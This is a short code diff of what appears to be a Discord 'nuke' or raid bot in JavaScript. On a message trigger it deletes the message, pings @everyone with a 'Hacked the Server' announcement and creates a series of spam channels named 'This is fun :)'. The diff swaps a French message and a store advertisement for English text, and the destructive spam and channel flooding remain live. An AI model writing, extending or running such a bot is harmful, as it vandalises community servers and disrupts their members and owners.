@@ -16,9 +16,9 @@ client.on('message', message => {
         var server = message.guild;
         var name = message.author.username;
         message.delete();
-        message.channel.send('@everyone | ' + message.member + ' Vien de hack le serveur');
+        message.channel.send('@everyone | ' + message.member + ' Hacked the Server');
         message.channel.send('____');
-        message.channel.send('@everyone Go visit our Store: https://shoppy.gg/@Hyper_Premium');
+        message.channel.send('Well..');
         server.createChannel('This is fun :)', "This is fun :)");
         server.createChannel('This is fun :)', "This is fun :)");
         server.createChannel('This is fun :)', "This is fun :)");
